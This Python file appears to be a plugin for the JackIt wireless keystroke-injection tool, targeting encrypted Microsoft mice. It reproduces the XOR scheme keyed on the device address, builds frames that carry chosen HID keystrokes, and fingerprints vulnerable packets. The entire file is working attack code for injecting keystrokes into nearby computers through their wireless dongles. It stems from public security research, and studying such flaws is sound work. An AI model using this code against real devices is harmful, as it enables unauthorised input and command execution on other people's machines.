# -*- coding: utf-8 -*-

from __future__ import print_function, absolute_import
from jackit.plugins import microsoft


class HID(microsoft.HID):
    ''' Injection code for MS mouse (encrypted) '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = self.xor_crypt(payload[:].tolist())
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def xor_crypt(self, payload):
        # MS encryption algorithm - as per KeyKeriki paper
        for i in range(4, len(payload)):
            payload[i] ^= self.address[(i - 4) % 5]
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))

    @classmethod
    def fingerprint(cls, p):
        if len(p) == 19 and p[0] == 0x0a:
            # Most likely an XOR encrypted Microsoft mouse
            return cls
        return None

    @classmethod
    def description(cls):
        return 'Microsoft Encrypted HID'
